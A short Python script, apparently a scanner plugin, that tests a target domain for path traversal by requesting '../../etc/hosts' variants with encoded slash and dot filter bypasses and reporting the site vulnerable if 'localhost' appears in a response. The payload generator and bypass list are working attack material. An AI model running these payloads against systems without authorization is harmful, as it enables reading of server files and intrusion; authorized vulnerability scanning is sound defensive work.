import requests
import os
import json

default_payload = '../../../../../../../../etc/hosts'


ports = os.environ.get('PORTS')
ports = ports.strip(' ').split(',')
urls = ['https://{0}/'.format(os.environ.get('DOMAIN'))]
try:
    for port in ports:
        urls.append('http://{0}:{1}/'.format(os.environ.get('DOMAIN'), port))
except:
    pass
vuln_id = os.environ.get('VULN_ID')


def resp(state=False, url='https://{0}/'.format(os.environ.get('DOMAIN'))):
    if state:
        return json.dumps({"vulnerable": "True", "vuln_id": vuln_id, "description": url})
    else:
        return json.dumps({"vulnerable": "False", "vuln_id": vuln_id, "description": url})


def build_payoad():
    bypasses = {
        '/': ['\\', '%2f', '%5c'],
        '..': ['...', '.', 'NN', '%2e']
    }
    payload_list_draft = []
    payload_list = []
    for slash in bypasses.get('/'):
        payload_list_draft.append(default_payload.replace('/', slash))
    for dot in bypasses.get('..'):
        payload_list_draft.append(default_payload.replace('..', dot))
    for character in bypasses:
        for bypass_char in bypasses[character]:
            for payload in payload_list_draft:
                payload_list.append(payload.replace(character, bypass_char))
    return list(set(payload_list))


def check():
    try:
        for payload in build_payoad():
            # inject in url
            for url in urls:
                if 'localhost' in requests.get(url + payload, timeout=4, verify=False).content:
                    return resp(True, url)
    except Exception as ex:
        pass
    return resp(False, '')


if __name__ == '__main__':
    print(check())
